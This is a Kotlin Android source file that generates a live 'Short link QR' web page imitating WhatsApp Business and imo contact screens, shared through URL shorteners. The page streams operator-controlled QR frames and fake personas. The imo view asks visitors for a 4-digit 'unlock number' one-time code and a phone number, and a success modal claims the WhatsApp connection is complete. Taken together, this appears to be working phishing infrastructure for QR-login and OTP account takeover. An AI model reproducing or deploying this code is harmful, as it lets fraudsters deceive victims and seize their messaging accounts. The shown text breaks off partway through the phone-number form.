package com.example.util

import android.content.Context
import android.util.Base64
import android.util.Log
import com.example.data.model.PathChannel
import com.example.data.model.WebsitePlatform
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.ConnectionPool
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.Collections
import java.util.concurrent.TimeUnit
import java.util.zip.Deflater

/**
 * ChannelWebPortalGenerator
 *
 * Engine v4 — Unified Single-Link Dual Website Architecture:
 * - Hosts BOTH the **WhatsApp Short Link QR Website** AND the **Israt Jahan imo QR Website**
 *   together inside ONE single link per channel (`<rootNode>/portalHtml.json` -> `https://is.gd/link_...`).
 * - When the user is on the **WhatsApp** button in the Android app, the website stays on the WhatsApp UI.
 * - When the user clicks the **imo** button in the Android app, `<rootNode>/state/mode` updates to `"imo"`
 *   and the EXACT SAME open website switches to the imo Website in real time (<50ms via SSE) without reload!
 * - Cuts Firebase RTDB load dramatically:
 *   1) Only 1 portal HTML & 1 live stream path per channel (no duplicate hosting).
 *   2) Zero background HTTP polling while SSE (`EventSource`) is active (`needLiveFallback` / `needStateFallback`).
 *   3) Strict monotonic `seq` + `ts` + `decGen` ordering and `preCropped` awareness so frames never jump or lag.
 */
object ChannelWebPortalGenerator {

    private const val TAG = "ChannelWebPortalGen"
    private const val PREFS_NAME = "channel_portal_links_prefs"
    const val PORTAL_ENGINE_VERSION = 5

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val syncedSlotsThisSession: MutableSet<Int> = Collections.synchronizedSet(mutableSetOf())
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    private val httpClient = OkHttpClient.Builder()
        .connectionPool(ConnectionPool(4, 2, TimeUnit.MINUTES))
        .connectTimeout(6, TimeUnit.SECONDS)
        .readTimeout(6, TimeUnit.SECONDS)
        .writeTimeout(6, TimeUnit.SECONDS)
        .build()

    fun getActiveWebsiteUrl(
        context: Context?,
        channel: PathChannel,
        @Suppress("UNUSED_PARAMETER") platform: WebsitePlatform = WebsitePlatform.WHATSAPP
    ): String {
        val prefKey = "short_url_slot_${channel.slotNumber}"
        if (context != null) {
            ensurePortalSynced(context, channel)
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val cached = prefs.getString(prefKey, null)
            if (!cached.isNullOrBlank() && cached.startsWith("https://")) {
                return cached
            }
        }
        val dedicated = channel.dedicatedShortUrl
        return if (dedicated.isNotBlank()) {
            dedicated
        } else {
            buildSelfContainedWebsiteUrl(channel)
        }
    }

    fun buildSelfContainedWebsiteUrl(
        channel: PathChannel,
        @Suppress("UNUSED_PARAMETER") platform: WebsitePlatform = WebsitePlatform.WHATSAPP
    ): String {
        val targetRoot = channel.rootNode
        val bootHtml = """<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel="preconnect" href="${channel.databaseUrl}" crossorigin><title>Live QR Portal - Ch #${channel.slotNumber}</title><style>html,body,iframe{margin:0;padding:0;width:100%;height:100dvh;border:0;overflow:hidden;background:#f0f2f5}#ld{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#f0f2f5;z-index:9}i{width:34px;height:34px;border:3px solid #cbd5e1;border-top-color:#008069;border-radius:50%;animation:s .65s linear infinite}@keyframes s{to{transform:rotate(360deg)}}</style><div id="ld"><i></i></div><iframe id="f" allow="clipboard-write;web-share" allowfullscreen onload="if(this.srcdoc)document.getElementById('ld').style.display='none'"></iframe><script>fetch("${channel.databaseUrl}/$targetRoot/portalHtml.json").then(r=>r.json()).then(h=>{if(h)document.getElementById("f").srcdoc=h;})</script>"""
        val compressedBytes = deflateUtf8(bootHtml)
        val base64Payload = Base64.encodeToString(compressedBytes, Base64.NO_WRAP)
        return "https://itty.bitty.site/#Short_link_QR_${channel.uniquePassword}/data:text/html;charset=utf-8;format=gz;base64,$base64Payload"
    }

    /**
     * Ensures the channel's unified `portalHtml.json` node in Firebase RTDB is synced
     * to the latest v4 dual-website engine at least once per session.
     */
    fun ensurePortalSynced(context: Context, channel: PathChannel) {
        if (!syncedSlotsThisSession.add(channel.slotNumber)) return
        syncChannelPortalOnLogin(context, channel)
    }

    /**
     * Publishes/updates the single unified dual-mode website (`WhatsApp + imo`) in Firebase RTDB
     * and syncs the currently selected app mode (`whatsapp` or `imo`) with zero duplicate writes.
     */
    fun syncChannelPortalOnLogin(context: Context, channel: PathChannel) {
        val appContext = context.applicationContext
        syncedSlotsThisSession.add(channel.slotNumber)
        scope.launch {
            syncUnifiedPortal(appContext, channel)
            try {
                appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putInt("portal_engine_ver_slot_${channel.slotNumber}", PORTAL_ENGINE_VERSION)
                    .apply()
            } catch (_: Exception) {}
        }
    }

    private fun syncUnifiedPortal(
        appContext: Context,
        channel: PathChannel
    ) {
        try {
            val prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val prefKey = "short_url_slot_${channel.slotNumber}"
            var shortUrl = channel.dedicatedShortUrl
            val bittyUrl = buildSelfContainedWebsiteUrl(channel)

            if (shortUrl.isBlank()) {
                shortUrl = prefs.getString(prefKey, "").orEmpty()
                if (shortUrl.isBlank()) {
                    shortUrl = requestShortUrl(bittyUrl)
                    if (shortUrl.startsWith("https://")) {
                        prefs.edit().putString(prefKey, shortUrl).apply()
                    }
                }
            } else {
                prefs.edit().putString(prefKey, shortUrl).apply()
            }

            val finalUrl = shortUrl.ifBlank { bittyUrl }
            val targetRoot = channel.rootNode
            val portalHtml = buildChannelPortalHtml(channel, finalUrl)

            val putHtmlReq = Request.Builder()
                .url("${channel.databaseUrl}/$targetRoot/portalHtml.json")
                .put(JSONObject.quote(portalHtml).toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(putHtmlReq).execute().close()

            val currentPlatform = AppPreferences.getInstance(appContext).selectedWebsitePlatform
            val modePatchJson = JSONObject().apply {
                put("mode", currentPlatform.id)
                put("modeTs", System.currentTimeMillis())
            }.toString()
            val patchModeReq = Request.Builder()
                .url("${channel.databaseUrl}/$targetRoot/state.json")
                .patch(modePatchJson.toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(patchModeReq).execute().close()

            val portalInfoJson = JSONObject().apply {
                put("slotNumber", channel.slotNumber)
                put("unifiedModes", "whatsapp,imo")
                put("engineVersion", PORTAL_ENGINE_VERSION)
                put("channelPassword", channel.uniquePassword)
                put("channelName", channel.nameBn)
                put("rootNode", targetRoot)
                put("shortUrl", finalUrl)
                put("bootstrapUrl", bittyUrl)
                put("updatedAt", System.currentTimeMillis())
            }.toString()

            val putReq = Request.Builder()
                .url("${channel.databaseUrl}/$targetRoot/portalInfo.json")
                .put(portalInfoJson.toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(putReq).execute().close()
            Log.i(TAG, "Synced unified v$PORTAL_ENGINE_VERSION (WhatsApp+imo) portal for channel #${channel.slotNumber}: $finalUrl")
        } catch (e: Exception) {
            Log.w(TAG, "Unified portal sync non-fatal warning: ${e.message}")
        }
    }

    private fun requestShortUrl(longUrl: String): String {
        for (endpoint in listOf("https://is.gd/create.php", "https://v.gd/create.php")) {
            try {
                val form = FormBody.Builder()
                    .add("format", "simple")
                    .add("url", longUrl)
                    .build()
                val req = Request.Builder().url(endpoint).post(form).build()
                httpClient.newCall(req).execute().use { resp ->
                    val txt = resp.body?.string()?.trim().orEmpty()
                    if (resp.isSuccessful && txt.startsWith("https://")) {
                        return txt
                    }
                }
            } catch (_: Exception) {
            }
        }
        return ""
    }

    private fun deflateUtf8(input: String): ByteArray {
        val data = input.toByteArray(Charsets.UTF_8)
        val deflater = Deflater(Deflater.BEST_COMPRESSION)
        deflater.setInput(data)
        deflater.finish()
        val outputStream = ByteArrayOutputStream(data.size / 2)
        val buffer = ByteArray(2048)
        while (!deflater.finished()) {
            val count = deflater.deflate(buffer)
            if (count > 0) {
                outputStream.write(buffer, 0, count)
            } else {
                break
            }
        }
        deflater.end()
        return outputStream.toByteArray()
    }

    /**
     * Backward-compatible alias returning the exact same unified dual-mode HTML.
     */
    fun buildImoChannelPortalHtml(channel: PathChannel, shareUrl: String = channel.readymadeWebsiteUrl): String {
        return buildChannelPortalHtml(channel, shareUrl)
    }

    /**
     * Unified Single-Link Dual Website HTML (WhatsApp Short Link QR + Israt Jahan imo QR)
     * - Automatically displays WhatsApp UI when app is on WhatsApp button (`mode === "whatsapp"`).
     * - Automatically switches in real time to imo UI when app clicks imo button (`mode === "imo"`).
     * - Zero duplicate polling, strict monotonic `seq`/`ts`/`decGen` ordering, zero double-cropping.
     */
    fun buildChannelPortalHtml(channel: PathChannel, shareUrl: String = channel.readymadeWebsiteUrl): String {
        val dbUrl = channel.databaseUrl
        val root = channel.rootNode
        val slot = channel.slotNumber
        val pw = channel.uniquePassword
        val safeShare = shareUrl.replace("\"", "")

        return """<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link rel="preconnect" href="$dbUrl" crossorigin>
<title>Short link QR - Ch #$slot</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html,body{width:100%;min-height:100dvh;background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;user-select:none}
.u-toast{position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:99;background:#0f172a;color:#fff;font-size:13px;font-weight:600;padding:9px 18px;border-radius:999px;box-shadow:0 6px 20px rgba(0,0,0,.22);display:none;white-space:nowrap}

/* === 1. WHATSAPP WEBSITE VIEW (.wa-root) === */
.wa-root{width:100%;height:100dvh;overflow:hidden;display:flex;align-items:center;justify-content:center;background:#f0f2f5}
.wa-main{position:relative;width:100%;max-width:420px;height:100%;display:flex;flex-direction:column;justify-content:space-between;background:#f0f2f5;overflow:hidden}
.wa-hdr{width:100%;height:52px;background:#fff;padding:0 52px 0 14px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6;flex-shrink:0}
.wa-hl{display:flex;align-items:center;gap:10px;color:#111827;font-size:18px;font-weight:600}
.wa-badge{display:flex;align-items:center;gap:6px;padding:4px 10px;background:#ecfdf5;border:1px solid #6ee7b7;color:#008069;border-radius:999px;font-size:12px;font-weight:700}
.wa-dot{width:8px;height:8px;border-radius:50%;background:#10b981;animation:wap 1.6s infinite}
@keyframes wap{0%,100%{opacity:1}50%{opacity:.35}}
.wa-tabs{width:100%;background:#fff;border-bottom:1px solid #e5e7eb;display:grid;grid-template-columns:1fr 1fr;flex-shrink:0}
.wa-tab{padding:12px 0;text-align:center;font-size:13.5px;font-weight:700;letter-spacing:.04em;text-decoration:none}
.wa-tab.on{color:#008069;position:relative}
.wa-tab.on::after{content:"";position:absolute;bottom:0;left:0;right:0;height:3.5px;background:#008069}
.wa-tab.off{color:#6b7280}
.wa-sbtn{position:absolute;top:8px;right:10px;z-index:30;width:36px;height:36px;border-radius:50%;border:1px solid #e5e7eb;background:#fff;color:#008069;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,.08)}
.wa-cnt{flex:1;width:100%;padding:0 16px;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:0}
.wa-cardw{position:relative;width:100%;display:flex;flex-direction:column;align-items:center;margin-top:26px}
.wa-av{position:absolute;top:-28px;z-index:10;width:56px;height:56px;border-radius:50%;background:#fff;padding:3px;box-shadow:0 2px 6px rgba(0,0,0,.1)}
.wa-av img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block}
.wa-card{width:100%;background:#fff;border-radius:16px;padding:36px 20px 20px;box-shadow:0 1px 4px rgba(0,0,0,.05);display:flex;flex-direction:column;align-items:center;text-align:center}
.wa-nm{font-size:17px;font-weight:700;color:#111827}
.wa-sub{font-size:12.5px;color:#6b7280;margin:2px 0 14px}
.wa-qrf{width:196px;height:196px;border-radius:14px;overflow:hidden;border:1px solid #f3f4f6;background:#fff;position:relative;display:flex;align-items:center;justify-content:center}
#waCv,#waVd{width:100%;height:100%;object-fit:contain;display:none;cursor:pointer;background:#000}
.wa-qrb{width:100%;height:100%;border:2px dashed rgba(0,168,132,.45);border-radius:14px;background:linear-gradient(135deg,#f0fdf4,#ecfdf5,#fff);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;cursor:pointer;padding:12px}
.wa-qric{width:54px;height:54px;border-radius:50%;background:#00a884;color:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,168,132,.3)}
.wa-qrl{font-size:13px;font-weight:800;color:#008069;letter-spacing:.04em;text-transform:uppercase}
.wa-cap{font-size:12.5px;line-height:1.35;color:#6b7280;max-width:250px;margin:14px auto 4px}
.wa-pbar{width:100%;padding:0 16px 10px;display:none;align-items:center;justify-content:center;gap:8px}
.wa-pbtn{background:#00a884;color:#fff;border:none;font-size:13px;font-weight:700;padding:8px 18px;border-radius:999px;box-shadow:0 4px 12px rgba(0,168,132,.3);display:flex;align-items:center;gap:8px;cursor:pointer}
.wa-ptm{font-size:11px;background:rgba(255,255,255,.22);padding:2px 7px;border-radius:999px}
.wa-px{width:28px;height:28px;border-radius:50%;border:none;background:#e5e7eb;color:#374151;font-weight:700;cursor:pointer}
.wa-ftr{width:100%;padding:0 20px 18px;flex-shrink:0}
.wa-cta{display:flex;align-items:center;justify-content:center;width:100%;background:#00a884;color:#fff;font-size:15px;font-weight:600;padding:12px 0;border-radius:999px;text-decoration:none;box-shadow:0 2px 6px rgba(0,168,132,.25)}
.wa-smod{position:fixed;inset:0;z-index:60;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;padding:16px}
.wa-sbox{width:100%;max-width:340px;background:#fff;border-radius:24px;padding:24px;text-align:center;box-shadow:0 16px 40px rgba(0,0,0,.25);position:relative}
.wa-scls{position:absolute;top:12px;right:12px;width:30px;height:30px;border-radius:50%;border:none;background:#f3f4f6;cursor:pointer;font-weight:700}
.wa-sic{width:64px;height:64px;border-radius:50%;background:#d1fae5;color:#00a884;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:32px;font-weight:700}

/* === 2. IMO WEBSITE VIEW (.imo-root) === */
.imo-root{width:100%;min-height:100dvh;display:none;justify-content:center;align-items:flex-start;background:#F3F5F5;color:#0f172a}
.imo-vp{width:100%;max-width:420px;min-height:100dvh;display:flex;flex-direction:column;background:#F3F5F5;position:relative;box-shadow:0 2px 14px rgba(0,0,0,.04)}
.imo-top{width:100%;height:56px;padding:0 20px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
.imo-ttl{font-size:19px;font-weight:500;color:#0f172a;letter-spacing:-.01em}
.imo-tr{display:flex;align-items:center;gap:8px}
.imo-chb{font-size:11px;font-weight:700;color:#009CFD;background:#e0f2fe;border:1px solid #bae6fd;padding:3px 9px;border-radius:999px;display:flex;align-items:center;gap:5px}
.imo-chd{width:7px;height:7px;border-radius:50%;background:#009CFD;animation:wap 1.6s infinite}
.imo-scn{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#0f172a;text-decoration:none}
.imo-cnt{width:100%;flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:12px 20px 36px;gap:16px}
.imo-card{position:relative;width:100%;max-width:342px;background:#fff;border-radius:28px;padding:20px;box-shadow:0 2px 16px rgba(0,0,0,.03);border:1px solid rgba(241,245,249,.8);overflow:hidden;display:flex;flex-direction:column;align-items:center}
.imo-wm{pointer-events:none;position:absolute;top:-4px;right:-4px;opacity:.42}
.imo-prof{width:100%;display:flex;align-items:center;justify-content:space-between;z-index:10;padding:4px 4px 0}
.imo-pl{display:flex;align-items:center;gap:12px}
.imo-av{width:52px;height:52px;border-radius:50%;overflow:hidden;background:#e2e8f0;flex-shrink:0}
.imo-av img{width:100%;height:100%;object-fit:cover;display:block}
.imo-pnm{font-size:16px;font-weight:500;color:#0f172a}
.imo-shbtn{border:none;background:#f0f9ff;color:#009CFD;font-size:12px;font-weight:600;padding:6px 11px;border-radius:999px;cursor:pointer}
.imo-qrw{margin:20px 0 16px;padding:4px;background:#fff;border-radius:16px;display:flex;align-items:center;justify-content:center;z-index:10}
.imo-qrf{width:218px;height:218px;border-radius:16px;overflow:hidden;background:#090D16;border:1px solid rgba(15,23,42,.5);position:relative;display:flex;align-items:center;justify-content:center;cursor:pointer}
#imoStCv,#imoLvCv,#imoLvVd{width:100%;height:100%;display:block}
#imoLvCv,#imoLvVd{object-fit:contain;background:#000;display:none}
.imo-sub{font-size:13.5px;color:#8C9BA8;text-align:center;z-index:10;padding-bottom:4px}
.imo-phbtn{width:100%;max-width:342px;height:58px;padding:0 20px;background:#fff;border-radius:20px;box-shadow:0 2px 12px rgba(0,0,0,.025);border:1px solid rgba(241,245,249,.8);display:flex;align-items:center;justify-content:center;gap:10px;cursor:pointer;color:#2C8EC4;font-size:15.5px}
.imo-phbox{width:100%;max-width:342px;background:#fff;border-radius:22px;padding:20px;box-shadow:0 2px 14px rgba(0,0,0,.03);border:1px solid #f1f5f9;display:none;position:relative}
.imo-phr{width:100%;padding-bottom:10px;border-bottom:1px solid #e2e8f0;display:flex;align-items:center}
.imo-ccbtn{background:none;border:none;display:flex;align-items:center;gap:6px;padding-right:10px;cursor:pointer;color:#298ac9;font-size:15px}
.imo-div{width:1px;height:20px;background:#e2e8f0;margin-right:10px}
.imo-phinp{width:100%;border:none;outline:none;font-size:15.5px;color:#0f172a;background:transparent}
.imo-addb{width:100%;margin-top:16px;height:44px;background:#009CFD;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer}
.imo-dd{position:absolute;top:56px;left:8px;right:8px;z-index:40;background:#fff;border-radius:16px;box-shadow:0 12px 32px rgba(0,0,0,.14);border:1px solid #e2e8f0;max-height:240px;overflow-y:auto;display:none;padding:6px}
.imo-ddi{width:100%;padding:8px 10px;border:none;background:none;display:flex;align-items:center;justify-content:space-between;font-size:13px;border-radius:10px;cursor:pointer;color:#334155}
.imo-ddi:hover{background:#f1f5f9}
.imo-lkbar{width:100%;max-width:342px;height:46px;padding:0 16px;background:rgba(255,255,255,.95);border-radius:16px;border:1px solid #f1f5f9;display:none;align-items:center;justify-content:center;gap:8px;font-size:13.5px;color:#334155;cursor:pointer}
.imo-ver{width:100%;margin-top:10px;z-index:10;display:none;flex-direction:column;align-items:center}
.imo-ill{width:100%;height:126px;border-radius:20px 20px 0 0;background:linear-gradient(180deg,#E5F2FB,#EEF7FD);display:flex;align-items:flex-end;justify-content:center;overflow:hidden;border-bottom:1px solid #f1f5f9}
.imo-mock{width:144px;height:108px;background:#E2EAF1;border-radius:18px 18px 0 0;padding:4px 4px 0}
.imo-mscr{width:100%;height:100%;background:#fff;border-radius:14px 14px 0 0;padding:10px 8px;display:flex;flex-direction:column;align-items:center;justify-content:center}
.imo-mpin{font-size:17px;font-weight:900;color:#1e293b;letter-spacing:5px;font-family:monospace}
.imo-vbd{width:100%;padding:14px 6px 4px;text-align:left}
.imo-vtt{font-size:15px;color:#222B36;font-weight:500}
.imo-verr{font-size:13px;color:#EE4D4D;margin-top:4px;display:none}
.imo-bxs{position:relative;margin:14px 0 8px;display:flex;align-items:center;justify-content:space-between;gap:10px;max-width:270px}
.imo-oinp{position:absolute;inset:0;width:100%;height:100%;opacity:0;z-index:20;cursor:pointer}
.imo-bx{width:52px;height:56px;border-radius:14px;background:#fff;border:1.5px solid #DEE5EC;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:500;color:#0f172a}
.imo-bx.act{border:2px solid #009CFD;box-shadow:0 0 0 2px rgba(0,156,253,.12)}
.imo-vft{width:100%;display:flex;justify-content:flex-end;margin-top:10px}
.imo-rsnd{background:none;border:none;color:#009CFD;font-size:15px;font-weight:500;cursor:pointer;padding:4px 8px}
.imo-pbar{width:100%;max-width:342px;display:none;align-items:center;justify-content:center;gap:8px}
.imo-pbtn{background:#009CFD;color:#fff;border:none;font-size:13px;font-weight:600;padding:8px 18px;border-radius:999px;display:flex;align-items:center;gap:8px;cursor:pointer}
.imo-modal{position:fixed;inset:0;z-index:70;background:rgba(0,0,0,.45);display:none;align-items:center;justify-content:center;padding:20px}
.imo-md{width:100%;max-width:320px;background:#fff;border-radius:16px;padding:24px 24px 16px;box-shadow:0 16px 40px rgba(0,0,0,.2)}
.imo-mdp{font-size:15.5px;line-height:1.48;color:#1E293B}
.imo-mdok{margin-top:24px;display:flex;justify-content:flex-end}
.imo-mdok button{background:none;border:none;color:#009CFD;font-size:15px;font-weight:600;cursor:pointer;padding:6px 10px}
#imoProfScr{display:none;width:100%;min-height:100dvh;background:#F4F5F7;flex-direction:column;justify-content:space-between}
.imo-ptop{width:100%;display:flex;flex-direction:column;align-items:center;padding:54px 16px 0}
.imo-pav{width:102px;height:102px;border-radius:50%;overflow:hidden;border:2px solid #fff;box-shadow:0 2px 12px rgba(0,0,0,.08);background:#e2e8f0}
.imo-pav img{width:100%;height:100%;object-fit:cover}
.imo-pnm2{font-size:21px;font-weight:700;color:#1E293B;margin-top:14px}
.imo-plst{width:100%;max-width:370px;margin-top:26px;display:flex;flex-direction:column;gap:10px}
.imo-pit{width:100%;background:#fff;border-radius:20px;padding:14px 16px;border:1px solid #f1f5f9;display:flex;align-items:center;justify-content:space-between;font-size:15.5px;font-weight:500;color:#1E293B;cursor:pointer}
.imo-pit.red{color:#EE4D4D;justify-content:flex-start;gap:10px}
.imo-pbot{width:100%;max-width:370px;margin:0 auto;padding:16px 16px 28px}
.imo-padd{width:100%;height:50px;border-radius:22px;background:#009CFD;color:#fff;border:none;font-size:16px;font-weight:500;cursor:pointer}
</style>
</head>
<body>
<div id="uToast" class="u-toast"></div>

<!-- ==================== 1. WHATSAPP WEBSITE CONTAINER ==================== -->
<div id="waRoot" class="wa-root">
<main class="wa-main">
  <button id="waSbtn" class="wa-sbtn" title="ওয়েবসাইট লিংক শেয়ার বা কপি করুন">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
  </button>
  <div>
    <header class="wa-hdr">
      <div class="wa-hl"><span>&#8592;</span><span>Short link QR</span></div>
      <div class="wa-badge"><span class="wa-dot"></span><span>Ch #$slot</span></div>
    </header>
    <div class="wa-tabs">
      <div class="wa-tab on">QR CODE</div>
      <a class="wa-tab off" href="https://whatsapp-qr-scanner.onrender.com/" target="_blank" rel="noopener noreferrer">VIDEO</a>
    </div>
  </div>

  <div class="wa-cnt">
    <div class="wa-cardw">
      <div class="wa-av">
        <img id="waAvImg" alt="mst:laboni" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' fill='%2300a884'/%3E%3Ccircle cx='40' cy='31' r='15' fill='%23fff'/%3E%3Cpath d='M14 72c4-15 15-23 26-23s22 8 26 23' fill='%23fff'/%3E%3C/svg%3E">
      </div>
      <div class="wa-card">
        <div class="wa-nm">mst:laboni</div>
        <div class="wa-sub">WhatsApp Business Account</div>
        <div class="wa-qrf">
          <canvas id="waCv"></canvas>
          <video id="waVd" autoplay loop muted playsinline></video>
          <button id="waQrb" class="wa-qrb" type="button">
            <div class="wa-qric">
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
            </div>
            <span id="waQrl" class="wa-qrl">QR cod</span>
          </button>
        </div>
        <p class="wa-cap">Scan this code to start a WhatsApp Business chat with mst:laboni</p>
      </div>
    </div>
  </div>

  <div id="waHboxes" style="position:fixed;opacity:0;pointer-events:none;left:-9999px"></div>
  <div id="waPbar" class="wa-pbar">
    <button id="waPbtn" class="wa-pbtn" type="button">
      <span id="waPlbl">কপি কোড</span>
      <span id="waPtm" class="wa-ptm">60s</span>
    </button>
    <button id="waPx" class="wa-px" type="button">&times;</button>
  </div>

  <div class="wa-ftr">
    <a class="wa-cta" href="https://whatsapp-qr-scanner.onrender.com/" target="_blank" rel="noopener noreferrer">Qr code স্ক্যান করতে এখানে ক্লিক করুন</a>
  </div>

  <div id="waSmod" class="wa-smod">
    <div class="wa-sbox">
      <button id="waScls" class="wa-scls" type="button">&times;</button>
      <div class="wa-sic">&#10003;</div>
      <h3 style="font-size:20px;font-weight:700;color:#111827;margin-bottom:6px">অভিনন্দন! সফল হয়েছে</h3>
      <p style="font-size:13.5px;color:#6b7280;margin-bottom:20px">আপনার হোয়াটসঅ্যাপ সংযোগ প্রক্রিয়া সফলভাবে সম্পন্ন হয়েছে। নিচের বাটনে চাপ দিয়ে সরাসরি হোয়াটসঅ্যাপ ওপেন করুন।</p>
      <a id="waLnk" class="wa-cta" href="https://wa.me/message/D7N3W5X4Z3Y2B1" target="_blank" rel="noopener noreferrer">হোয়াটসঅ্যাপ ওপেন করুন</a>
    </div>
  </div>
</main>
</div>

<!-- ==================== 2. IMO WEBSITE CONTAINER ==================== -->
<div id="imoRoot" class="imo-root">
<div class="imo-vp">
  <div id="imoMainScr">
    <header class="imo-top">
      <h1 class="imo-ttl">My QR code</h1>
      <div class="imo-tr">
        <div class="imo-chb"><span class="imo-chd"></span><span>imo #$slot</span></div>
        <a class="imo-scn" href="https://imo.onelink.me/1MBm?qr-login-info=qr.nWgecayCFrMq5063&af_dp=imo%3A%2F%2Fqr_code_device" target="_blank" rel="noopener noreferrer" title="Scan QR Code">
          <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 8.5V5.5A1.5 1.5 0 0 1 5.5 4H8.5"/><path d="M15.5 4H18.5A1.5 1.5 0 0 1 20 5.5V8.5"/><path d="M4 15.5V18.5A1.5 1.5 0 0 0 5.5 20H8.5"/><path d="M15.5 20H18.5A1.5 1.5 0 0 0 20 18.5V15.5"/><line x1="6.5" y1="12" x2="17.5" y2="12"/></svg>
        </a>
      </div>
    </header>
    <div class="imo-cnt">
      <div class="imo-card">
        <div id="imoWm" class="imo-wm">
          <svg width="150" height="130" viewBox="0 0 160 140" fill="none"><path d="M140 10C155 10 165 20 165 38V82C165 100 152 112 134 112H100L78 132C74 135 70 133 70 128V112H58C40 112 28 100 28 82V38C28 20 40 10 58 10H140Z" fill="#E5EAEF"/><text x="96" y="74" text-anchor="middle" dominant-baseline="central" fill="#D3DDE5" font-weight="900" font-size="42">imo</text></svg>
        </div>
        <div class="imo-prof">
          <div class="imo-pl">
            <div class="imo-av"><img id="imoAv1" alt="Israt Jahan" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' fill='%23009CFD'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23fff'/%3E%3Cpath d='M16 70c4-14 14-21 24-21s20 7 24 21' fill='%23fff'/%3E%3C/svg%3E"></div>
            <span class="imo-pnm">Israt Jahan</span>
          </div>
          <button id="imoShBtn" class="imo-shbtn" type="button">Share</button>
        </div>
        <div id="imoQrSec" style="width:100%;display:flex;flex-direction:column;align-items:center">
          <div class="imo-qrw">
            <div id="imoQrFrame" class="imo-qrf" title="Tap to connect live imo QR">
              <canvas id="imoStCv" width="320" height="320"></canvas>
              <canvas id="imoLvCv"></canvas>
              <video id="imoLvVd" autoplay loop muted playsinline></video>
            </div>
          </div>
          <p class="imo-sub">Scan the QR code to add me on imo</p>
        </div>
        <div id="imoVerSec" class="imo-ver">
          <div class="imo-ill"><div class="imo-mock"><div class="imo-mscr"><div id="imoMpin" class="imo-mpin">* * * *</div></div></div></div>
          <div class="imo-vbd">
            <p class="imo-vtt">Resent Your Unlock Number</p>
            <p id="imoVerr" class="imo-verr">Your unlock number incorrect</p>
            <div class="imo-bxs">
              <input id="imoOinp" class="imo-oinp" type="tel" inputmode="numeric" maxlength="4" autocomplete="one-time-code">
              <div class="imo-bx act" id="imoBx0"></div><div class="imo-bx" id="imoBx1"></div><div class="imo-bx" id="imoBx2"></div><div class="imo-bx" id="imoBx3"></div>
            </div>
            <div class="imo-vft"><button id="imoRsnd" class="imo-rsnd" type="button">Resend</button></div>
          </div>
        </div>
      </div>
      <div id="imoPbar" class="imo-pbar"><button id="imoPbtn" class="imo-pbtn" type="button"><span id="imoPlbl">Copy Code</span></button></div>
      <button id="imoPhBtn" class="imo-phbtn" type="button">
        <svg width="18" height="22" viewBox="0 0 24 28" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="4" y="2" width="16" height="24" rx="4"/><line x1="10" y1="21" x2="14" y2="21"/></svg>
        <span>Add with Phone Number</span>
      </button>
      <div id="imoPhBox" class="imo-phbox">
        <form id="imoPhForm">
          <div class="imo-phr">
            <button id="imoCcBtn" class="imo-ccbtn" type="button"><span id="imoCcFlg">🇸🇦</span><span id="imoCcTxt">+966</span></button>
            <div class="imo-div"></div>
            <input id="imoPhInp" class="imo-phinp" type="tel" placeholder="Phone">
          </div>
          <div id="imoCcDd" class="imo-dd"></div>
